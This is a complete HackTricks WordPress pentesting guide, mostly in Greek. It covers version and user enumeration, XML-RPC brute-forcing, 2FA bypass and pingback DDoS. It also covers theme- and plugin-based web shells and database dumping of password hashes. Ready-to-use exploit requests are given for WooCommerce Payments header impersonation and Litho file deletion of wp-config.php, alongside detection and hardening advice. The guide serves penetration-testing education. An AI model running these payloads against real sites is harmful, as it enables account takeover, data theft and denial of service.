# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

- **Uploaded** αρχεία αποθηκεύονται στο: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Τα αρχεία των themes βρίσκονται στο /wp-content/themes/,** οπότε αν αλλάξετε κάποιο php του theme για να αποκτήσετε RCE πιθανότατα θα χρησιμοποιήσετε αυτό το path. Για παράδειγμα: Χρησιμοποιώντας **theme twentytwelve** μπορείτε να **προσπελάσετε** το αρχείο **404.php** στο: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Ένα ακόμη χρήσιμο url μπορεί να είναι:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Στο **wp-config.php** μπορείτε να βρείτε το root password της βάσης δεδομένων.
- Προεπιλεγμένες διαδρομές login προς έλεγχο: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` περιέχει χρήσιμες πληροφορίες όπως η έκδοση του WordPress που είναι εγκατεστημένη.
- `wp-activate.php` χρησιμοποιείται για τη διαδικασία ενεργοποίησης μέσω email κατά τη ρύθμιση ενός νέου WordPress ιστότοπου.
- Login folders (may be renamed to hide it):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` είναι ένα αρχείο που αντιπροσωπεύει ένα χαρακτηριστικό του WordPress που επιτρέπει τη μετάδοση δεδομένων με HTTP ως μηχανισμό μεταφοράς και XML ως μηχανισμό κωδικοποίησης. Αυτού του είδους η επικοινωνία έχει αντικατασταθεί από το WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Ο φάκελος `wp-content` είναι ο κύριος κατάλογος όπου αποθηκεύονται plugins και themes.
- `wp-content/uploads/` είναι ο κατάλογος όπου αποθηκεύονται τα αρχεία που ανεβαίνουν στην πλατφόρμα.
- `wp-includes/` είναι ο κατάλογος όπου αποθηκεύονται τα core αρχεία, όπως πιστοποιητικά, γραμματοσειρές, αρχεία JavaScript και widgets.
- `wp-sitemap.xml` Σε εκδόσεις WordPress 5.5 και νεότερες, το WordPress δημιουργεί ένα sitemap XML αρχείο με όλες τις δημόσιες αναρτήσεις και τους δημόσια ερωτήσιμους τύπους αναρτήσεων και ταξινομήσεις.

**Post exploitation**

- Το `wp-config.php` αρχείο περιέχει πληροφορίες που απαιτούνται από το WordPress για σύνδεση στη βάση δεδομένων, όπως το όνομα της βάσης δεδομένων, το database host, username και password, authentication keys και salts, και το database table prefix. Αυτό το αρχείο ρύθμισης μπορεί επίσης να χρησιμοποιηθεί για την ενεργοποίηση του DEBUG mode, το οποίο μπορεί να είναι χρήσιμο στην αντιμετώπιση προβλημάτων.

### Δικαιώματα Χρηστών

- **Administrator**
- **Editor**: Δημοσιεύει και διαχειρίζεται τις δικές του και άλλων αναρτήσεις
- **Author**: Δημοσιεύει και διαχειρίζεται τις δικές του αναρτήσεις
- **Contributor**: Γράφει και διαχειρίζεται τις αναρτήσεις του αλλά δεν μπορεί να τις δημοσιεύσει
- **Subscriber**: Προβάλει αναρτήσεις και επεξεργάζεται το προφίλ του

## **Παθητική Αναγνώριση**

### **Βρες την έκδοση του WordPress**

Ελέγξτε αν μπορείτε να βρείτε τα αρχεία `/license.txt` ή `/readme.html`

Μέσα στον **source code** της σελίδας (παράδειγμα από [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Αρχεία CSS link

![](<../../images/image (533).png>)

- Αρχεία JavaScript

![](<../../images/image (524).png>)

### Λήψη Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Λήψη θεμάτων
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Εξαγωγή εκδόσεων γενικά
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Ενεργή αναγνώριση

### Plugins and Themes

Πιθανότατα δεν θα μπορέσετε να εντοπίσετε όλα τα Plugins και Themes. Για να τα ανακαλύψετε όλα, θα χρειαστεί να **actively Brute Force a list of Plugins and Themes** (ελπίζουμε ότι υπάρχουν αυτοματοποιημένα εργαλεία που περιέχουν αυτές τις λίστες).

### Χρήστες

- **ID Brute:** Αποκτάτε έγκυρους χρήστες από ένα WordPress site με Brute Forcing users IDs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Αν οι απαντήσεις είναι **200** ή **30X**, αυτό σημαίνει ότι το id είναι **έγκυρο**. Αν η απάντηση είναι **400**, τότε το id είναι **άκυρο**.

- **wp-json:** Μπορείτε επίσης να δοκιμάσετε να λάβετε πληροφορίες για τους χρήστες κάνοντας ερώτημα στο:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Ένα ακόμη endpoint `/wp-json/` που μπορεί να αποκαλύψει κάποιες πληροφορίες για χρήστες είναι:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Σημειώστε ότι αυτό το endpoint εκθέτει μόνο χρήστες που έχουν δημοσιεύσει. **Θα παρέχονται μόνο πληροφορίες για τους χρήστες που έχουν αυτή τη δυνατότητα ενεργοποιημένη**.

Επίσης σημειώστε ότι **/wp-json/wp/v2/pages** μπορεί να leak διευθύνσεις IP.

- **Login username enumeration**: Όταν κάνετε login στο **`/wp-login.php`**, το **μήνυμα** είναι **διαφορετικό** ανάλογα με το αν το **όνομα χρήστη υπάρχει ή όχι**.

### XML-RPC

Αν το `xml-rpc.php` είναι ενεργό μπορείτε να εκτελέσετε brute-force σε διαπιστευτήρια ή να το χρησιμοποιήσετε για να εκτοξεύσετε DoS επιθέσεις σε άλλους πόρους. (Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία[ using this](https://github.com/relarizky/wpxploit) για παράδειγμα).

Για να δείτε αν είναι ενεργό δοκιμάστε να αποκτήσετε πρόσβαση στο _**/xmlrpc.php**_ και στείλτε το παρακάτω αίτημα:

**Έλεγχος**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Διαπιστευτήρια Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ή **`metaWeblog.getUsersBlogs`** είναι μερικές από τις μεθόδους που μπορούν να χρησιμοποιηθούν για brute-force διαπιστευτηρίων. Αν βρείτε κάποια από αυτές, μπορείτε να στείλετε κάτι σαν:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Το μήνυμα _"Incorrect username or password"_ μέσα σε μια απάντηση με κωδικό 200 πρέπει να εμφανίζεται εάν τα credentials δεν είναι έγκυρα.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Χρησιμοποιώντας τα σωστά credentials μπορείτε να ανεβάσετε ένα αρχείο. Στην απάντηση η διαδρομή θα εμφανιστεί ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Αυτή η μέθοδος προορίζεται για προγράμματα και όχι για ανθρώπους, και είναι παλιά, οπότε δεν υποστηρίζει 2FA. Έτσι, αν έχετε έγκυρα creds αλλά η κύρια είσοδος προστατεύεται από 2FA, **μπορεί να καταφέρετε να καταχραστείτε το xmlrpc.php για να κάνετε login με αυτά τα creds παρακάμπτοντας το 2FA**. Σημειώστε ότι δεν θα μπορείτε να εκτελέσετε όλες τις ενέργειες που μπορείτε να κάνετε μέσω της κονσόλας, αλλά ίσως εξακολουθείτε να μπορείτε να φτάσετε σε RCE όπως εξηγεί ο Ippsec στο [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **χιλιάδες** of Wordpress **sites** to **access** one **τοποθεσία** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Αν λάβετε **faultCode** με τιμή **μεγαλύτερη** από **0** (17), αυτό σημαίνει ότι η port είναι ανοιχτή.

Ρίξτε μια ματιά στη χρήση του **`system.multicall`** στην προηγούμενη ενότητα για να μάθετε πώς να εκμεταλλευτείτε αυτή τη μέθοδο για να προκαλέσετε DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Αυτό το αρχείο συνήθως υπάρχει στη ρίζα του Wordpress site: **`/wp-cron.php`**\
Όταν αυτό το αρχείο είναι **accessed** εκτελείται ένα "**heavy**" MySQL **query**, οπότε μπορεί να χρησιμοποιηθεί από **attackers** για να **cause** ένα **DoS**.\
Επίσης, από προεπιλογή, το `wp-cron.php` καλείται σε κάθε φόρτωση σελίδας (κάθε φορά που ένας client ζητάει οποιαδήποτε Wordpress σελίδα), το οποίο σε sites με υψηλή επισκεψιμότητα μπορεί να προκαλέσει προβλήματα (DoS).

Συνίσταται να απενεργοποιηθεί το Wp-Cron και να δημιουργηθεί ένα πραγματικό cronjob μέσα στον host που θα εκτελεί τις απαραίτητες ενέργειες σε τακτά διαστήματα (χωρίς να προκαλεί προβλήματα).

### /wp-json/oembed/1.0/proxy - SSRF

Δοκίμασε να προσπελάσεις _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ και το Worpress site μπορεί να κάνει ένα request σε εσένα.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Αυτό το εργαλείο ελέγχει εάν υπάρχει το **methodName: pingback.ping** και το path **/wp-json/oembed/1.0/proxy** και αν υπάρχουν, προσπαθεί να τα εκμεταλλευτεί.

## Αυτόματα Εργαλεία
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Απόκτηση πρόσβασης με την επανεγγραφή ενός bit

Περισσότερο από μια πραγματική επίθεση, αυτό είναι μια περιέργεια. Στο CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) μπορούσατε να αναστρέψετε 1 bit σε οποιοδήποτε wordpress αρχείο. Έτσι, μπορούσατε να αναστρέψετε τη θέση `5389` του αρχείου `/var/www/html/wp-includes/user.php` ώστε να μετατρέψετε την πράξη NOT (`!`) σε NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Πίνακας RCE**

**Τροποποίηση ενός php από το χρησιμοποιούμενο θέμα (απαιτούνται admin credentials)**

Appearance → Theme Editor → 404 Template (στα δεξιά)

Αλλάξτε το περιεχόμενο σε ένα php shell:

![](<../../images/image (384).png>)

Αναζητήστε στο Internet πώς μπορείτε να αποκτήσετε πρόσβαση σε αυτή την ενημερωμένη σελίδα. Σε αυτή την περίπτωση πρέπει να αποκτήσετε πρόσβαση εδώ: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Μπορείτε να χρησιμοποιήσετε:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
για να αποκτήσετε μία session.

## Plugin RCE

### PHP plugin

Ενδέχεται να είναι δυνατό να ανεβάσετε αρχεία .php ως plugin.\
Δημιουργήστε το php backdoor σας χρησιμοποιώντας για παράδειγμα:

![](<../../images/image (183).png>)

Στη συνέχεια προσθέστε ένα νέο plugin:

![](<../../images/image (722).png>)

Ανεβάστε το plugin και πατήστε Install Now:

![](<../../images/image (249).png>)

Κάντε κλικ στο Procced:

![](<../../images/image (70).png>)

Πιθανότατα αυτό δεν θα κάνει τίποτα, αλλά αν μεταβείτε στο Media, θα δείτε το shell σας ανεβασμένο:

![](<../../images/image (462).png>)

Ανοίγοντάς το θα δείτε το URL για την εκτέλεση του reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Αυτή η μέθοδος περιλαμβάνει την εγκατάσταση ενός malicious plugin που είναι γνωστό ότι είναι ευπαθές και μπορεί να εκμεταλλευτεί για την απόκτηση ενός web shell. Η διαδικασία εκτελείται μέσω του WordPress dashboard ως εξής:

1. **Plugin Acquisition**: Το plugin αποκτάται από μια πηγή όπως το Exploit DB, όπως [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Μεταβείτε στο WordPress dashboard, στη συνέχεια πηγαίνετε σε `Dashboard > Plugins > Upload Plugin`.
- Ανεβάστε το zip αρχείο του κατεβασμένου plugin.
3. **Plugin Activation**: Μόλις το plugin εγκατασταθεί επιτυχώς, πρέπει να ενεργοποιηθεί μέσω του dashboard.
4. **Exploitation**:
- Με το plugin "reflex-gallery" εγκατεστημένο και ενεργοποιημένο, μπορεί να εκμεταλλευτεί επειδή είναι γνωστό ότι είναι ευπαθές.
- Το Metasploit framework παρέχει ένα exploit για αυτή την ευπάθεια. Φορτώνοντας το κατάλληλο module και εκτελώντας συγκεκριμένες εντολές, μπορεί να δημιουργηθεί μια meterpreter session, παρέχοντας μη εξουσιοδοτημένη πρόσβαση στην ιστοσελίδα.
- Σημειώνεται ότι αυτή είναι μόνο μία από τις πολλές μεθόδους για να εκμεταλλευτείτε ένα WordPress site.

Το περιεχόμενο περιλαμβάνει οπτικά βοηθήματα που απεικονίζουν τα βήματα στο WordPress dashboard για την εγκατάσταση και ενεργοποίηση του plugin. Ωστόσο, είναι σημαντικό να σημειωθεί ότι η εκμετάλλευση ευπαθειών με αυτόν τον τρόπο είναι παράνομη και ανήθικη χωρίς την κατάλληλη εξουσιοδότηση. Αυτές οι πληροφορίες πρέπει να χρησιμοποιούνται υπεύθυνα και μόνο σε νομικό πλαίσιο, όπως σε penetration testing με ρητή άδεια.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Από XSS σε RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ είναι ένα script σχεδιασμένο να αναβαθμίζει μια **Cross-Site Scripting (XSS)** ευπάθεια σε **Remote Code Execution (RCE)** ή άλλες κρίσιμες ευπάθειες στο WordPress. Για περισσότερες πληροφορίες δείτε [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Παρέχει **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Δημιουργεί έναν χρήστη στο WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Ανεβάζει το custom plugin (backdoor) σας στο WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Επεξεργασία ενός Built-In plugin στο WordPress.
- _**(RCE) Built-In Theme Edit:**_ Επεξεργασία ενός Built-In theme στο WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits για third-party WordPress Plugins/Themes.

## Post Exploitation

Εξαγωγή ονομάτων χρήστη και κωδικών πρόσβασης:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Αλλαγή admin password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Επιφάνεια Επίθεσης

Η γνώση του τρόπου με τον οποίο ένα Wordpress plugin μπορεί να εκθέσει λειτουργικότητα είναι κρίσιμη για να εντοπιστούν ευπάθειες στη λειτουργία του. Μπορείτε να δείτε πώς ένα plugin μπορεί να εκθέσει λειτουργίες στα παρακάτω σημεία και κάποια παραδείγματα ευάλωτων plugins στο [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Ένας από τους τρόπους με τους οποίους ένα plugin μπορεί να εκθέσει functions σε χρήστες είναι μέσω AJAX handlers. Αυτές μπορεί να περιέχουν bugs στη λογική, την authorization ή την authentication. Επιπλέον, είναι αρκετά συχνό αυτές οι συναρτήσεις να βασίζουν τόσο την authentication όσο και την authorization στην ύπαρξη ενός Wordpress nonce που **οποιοσδήποτε χρήστης αυθεντικοποιημένος στην εγκατάσταση Wordpress μπορεί να έχει** (ανεξαρτήτως ρόλου).

Αυτές είναι οι συναρτήσεις που μπορούν να χρησιμοποιηθούν για να εκθέσουν μια λειτουργία σε ένα plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Η χρήση του `nopriv` κάνει το endpoint προσβάσιμο από οποιουσδήποτε χρήστες (ακόμη και μη αυθεντικοποιημένους).**

> [!CAUTION]
> Επιπλέον, αν η συνάρτηση απλώς ελέγχει την εξουσιοδότηση του χρήστη με τη συνάρτηση `wp_verify_nonce`, αυτή η συνάρτηση ελέγχει μόνο ότι ο χρήστης είναι συνδεδεμένος, και συνήθως δεν ελέγχει τον ρόλο του χρήστη. Έτσι, χρήστες με χαμηλά προνόμια μπορεί να έχουν πρόσβαση σε ενέργειες υψηλών προνομίων.

- **REST API**

Είναι επίσης δυνατό να εκθέσετε συναρτήσεις από το wordpress καταχωρώντας ένα REST API χρησιμοποιώντας τη συνάρτηση `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Το `permission_callback` είναι μια συνάρτηση callback που ελέγχει αν ένας δοθέν χρήστης είναι εξουσιοδοτημένος να καλέσει τη μέθοδο API.

**Αν η ενσωματωμένη συνάρτηση `__return_true` χρησιμοποιηθεί, απλά θα παραλείψει τον έλεγχο δικαιωμάτων χρήστη.**

- **Άμεση πρόσβαση στο αρχείο PHP**

Φυσικά, το Wordpress χρησιμοποιεί PHP και τα αρχεία μέσα σε plugins είναι άμεσα προσβάσιμα από το web. Έτσι, σε περίπτωση που ένα plugin εκθέτει κάποια ευπαθή λειτουργικότητα που ενεργοποιείται απλώς με την πρόσβαση στο αρχείο, θα είναι εκμεταλλεύσιμο από οποιονδήποτε χρήστη.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Κάποια plugins υλοποιούν “trusted header” συντομεύσεις για εσωτερικές ενσωματώσεις ή reverse proxies και στη συνέχεια χρησιμοποιούν αυτό το header για να ορίσουν το τρέχον user context για αιτήματα REST. Εάν το header δεν είναι κρυπτογραφικά δεσμευμένο στο αίτημα από κάποιο upstream component, ένας επιτιθέμενος μπορεί να το πλαστογραφήσει και να προσπελάσει προνόμιες REST routes ως διαχειριστής.

- Impact: κλιμάκωση προνομίων χωρίς αυθεντικοποίηση σε διαχειριστή δημιουργώντας νέο λογαριασμό διαχειριστή μέσω του core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (αναγκάζει το user ID 1, συνήθως ο πρώτος λογαριασμός διαχειριστή).
- Exploited route: `POST /wp-json/wp/v2/users` με πίνακα ρόλων που αποδίδει ανυψωμένο ρόλο.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Γιατί λειτουργεί

- Το plugin αντιστοιχίζει ένα header που ελέγχεται από τον client στην κατάσταση πιστοποίησης και παραλείπει τους ελέγχους δικαιωμάτων.
- Ο πυρήνας του WordPress περιμένει την capability `create_users` για αυτό το route· το hack του plugin το παρακάμπτει ρυθμίζοντας απευθείας το context του current user από το header.

Αναμενόμενα δείγματα επιτυχίας

- HTTP 201 με JSON σώμα που περιγράφει τον δημιουργημένο χρήστη.
- Νέος admin χρήστης ορατός στο `wp-admin/users.php`.

Λίστα ελέγχου ανίχνευσης

- Χρησιμοποιήστε grep για `getallheaders()`, `$_SERVER['HTTP_...']`, ή vendor SDKs που διαβάζουν custom headers για να ορίσουν το context χρήστη (π.χ. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Ελέγξτε τις REST registrations για privileged callbacks που στερούνται στιβαρών ελέγχων `permission_callback` και αντί αυτού βασίζονται σε request headers.
- Αναζητήστε χρήσεις βασικών συναρτήσεων διαχείρισης χρηστών (`wp_insert_user`, `wp_create_user`) μέσα σε REST handlers που ελέγχονται μόνο από τιμές header.

Σκληροποίηση

- Μην εξάγετε ποτέ authentication ή authorization από headers ελεγχόμενα από τον client.
- Αν ένας reverse proxy πρέπει να εισάγει identity, τερματίστε την εμπιστοσύνη στον proxy και αφαιρέστε εισερχόμενα αντίγραφα (π.χ. `unset X-Wcpay-Platform-Checkout-User` στο edge), κατόπιν περάστε ένα signed token και επαληθεύστε το server-side.
- Για REST routes που εκτελούν privileged actions, απαιτήστε ελέγχους `current_user_can()` και αυστηρό `permission_callback` (μη χρησιμοποιείτε `__return_true`).
- Προτιμήστε first-party auth (cookies, application passwords, OAuth) αντί για header “impersonation”.

Αναφορές: δείτε τους συνδέσμους στο τέλος αυτής της σελίδας για ένα δημόσιο περιστατικό και ευρύτερη ανάλυση.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. Έναν **έλεγχο δικαιωμάτων (capability check)** (π.χ. `current_user_can()` ή τουλάχιστον `is_user_logged_in()`), και
2. Ένα **CSRF nonce** επαληθευμένο με `check_ajax_referer()` / `wp_verify_nonce()`, και
3. **Αυστηρή απολύμανση / επικύρωση εισόδου (input sanitisation / validation)**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Μη πιστοποιημένη πρόσβαση** – το `wp_ajax_nopriv_` hook έχει εγγραφεί.
* **Δεν υπάρχει nonce / έλεγχος capability** – οποιοσδήποτε επισκέπτης μπορεί να καλέσει το endpoint.
* **Καμία εξυγίανση διαδρομής** – η ελεγχόμενη από τον χρήστη `fontfamily` συμβολοσειρά συνενώνεται σε μια διαδρομή συστήματος αρχείων χωρίς φιλτράρισμα, επιτρέποντας το κλασικό `../../` traversal.

#### Εκμετάλλευση

Ένας επιτιθέμενος μπορεί να διαγράψει οποιοδήποτε αρχείο ή κατάλογο **κάτω από τον βασικό κατάλογο uploads** (normally `<wp-root>/wp-content/uploads/`) στέλνοντας ένα μόνο HTTP POST request:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Επειδή το `wp-config.php` βρίσκεται έξω από το *uploads*, τέσσερις ακολουθίες `../` αρκούν σε μια προεπιλεγμένη εγκατάσταση. Η διαγραφή του `wp-config.php` αναγκάζει το WordPress να μπει στον *οδηγό εγκατάστασης* στην επόμενη επίσκεψη, επιτρέποντας πλήρη κατάληψη του site (ο επιτιθέμενος απλώς παρέχει μια νέα DB διαμόρφωση και δημιουργεί έναν admin χρήστη).

Άλλοι σημαντικοί στόχοι περιλαμβάνουν αρχεία plugin/theme `.php` (για να παρακάμψουν plugins ασφαλείας) ή κανόνες `.htaccess`.

#### Λίστα ελέγχου ανίχνευσης

* Οποιοδήποτε callback `add_action( 'wp_ajax_nopriv_...')` που καλεί helpers συστήματος αρχείων (`copy()`, `unlink()`, `$wp_filesystem->delete()`, κ.λπ.).
* Συναρμολόγηση μη φιλτραρισμένης εισόδου χρήστη σε μονοπάτια (αναζητήστε `$_POST`, `$_GET`, `$_REQUEST`).
* Έλλειψη `check_ajax_referer()` και `current_user_can()`/`is_user_logged_in()`.

#### Σκληροποίηση
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Πάντα** θεωρείτε οποιαδήποτε ενέργεια write/delete στο δίσκο ως προνομιούχα και ελέγξτε προσεκτικά:
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Πολλά plugins υλοποιούν μια δυνατότητα "view as role" ή προσωρινής role-switching αποθηκεύοντας τους αρχικούς role(s) στο user meta ώστε να μπορούν να αποκατασταθούν αργότερα. Εάν η διαδρομή αποκατάστασης βασίζεται μόνο σε request parameters (π.χ. `$_REQUEST['reset-for']`) και σε μια plugin-maintained list χωρίς έλεγχο capabilities και επαλήθευση ενός valid nonce, αυτό γίνεται vertical privilege escalation.

Ένα πραγματικό παράδειγμα βρέθηκε στο πρόσθετο Admin and Site Enhancements (ASE) (≤ 7.6.2.1). Το reset branch επανέφερε ρόλους βάσει `reset-for=<username>` εάν το username εμφανιζόταν σε έναν εσωτερικό πίνακα `$options['viewing_admin_as_role_are']`, αλλά δεν εκτέλεσε ούτε έλεγχο `current_user_can()` ούτε επαλήθευση nonce πριν αφαιρέσει τους τρέχοντες ρόλους και επαναπροσθέσει τους αποθηκευμένους ρόλους από το user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Why it’s exploitable

- Εμπιστεύεται `$_REQUEST['reset-for']` και μια plugin option χωρίς server-side authorization.
